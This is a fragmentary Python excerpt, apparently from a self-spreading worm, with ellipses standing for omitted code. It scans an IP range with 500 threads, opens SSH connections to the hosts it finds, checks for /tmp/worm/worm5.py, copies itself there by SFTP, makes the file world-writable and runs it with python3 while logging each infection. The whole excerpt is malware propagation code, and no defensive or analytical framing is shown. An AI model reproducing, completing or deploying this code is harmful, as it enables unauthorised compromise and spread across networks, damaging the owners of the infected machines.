...
def get_list_of_hosts():
	...
	with ThreadPoolExecutor(max_workers=500) as executor:
		futures = [executor.submit(ping_host, f"{first_2_sections_str}.{ping}.{ping2}") for ping in range(49, 62) for ping2 in range(136, 246)]
...
######### Create an SSH client
  ...
  logging.basicConfig(filename='error.log', level=logging.INFO)
	...
	command = f"/usr/bin/python3 /tmp/worm/worm5.py >> /tmp/logfile.log 2>&1"
...
################# Check if the file exists
		stdin, stdout, stderr = client.exec_command(f"test -d /tmp/worm/worm5.py && echo 'exists' || echo 'not exists'")
		file_status = stdout.read().decode().strip()
		if file_status == 'not exists':
			
######################### If the file doesn't exist, create it   
			sftpClient.put(script_path, "/tmp/worm/" + "worm5.py")
  
			logging.info(f"files transferred to {host}") 
			print(f"files transferred to {host}") 

################# change permissions			
		client.exec_command("chmod 777 /tmp/worm/worm5.py")    
